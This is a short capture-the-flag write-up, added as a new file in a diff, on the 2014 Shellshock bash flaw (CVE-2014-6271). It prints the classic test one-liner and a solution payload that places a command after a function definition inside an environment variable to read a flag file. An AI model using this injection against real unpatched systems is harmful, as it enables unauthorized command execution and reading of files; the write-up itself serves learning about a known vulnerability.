@@ -1,0 +1,16 @@
+shellock! the concept of shellshock is:
+
+env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
+
+vulnerable
+this is a test
+
+this will be printed when using the bugged shell version (from 2014) -> running the arbitrary code placed after the function declaration inside the env var
+
+in our case we want to set a env var and the vulnerability to cat the flag file.
+the way to pass a env var as a arg when executing a file is as follows: VAR=blahblah ./file/path/
+
+so solution is: VULN='() { :;};cat flag' ./shellshock
+
+this gives us the flag:
+only if I knew CVE-2014-6271 ten years ago..!!
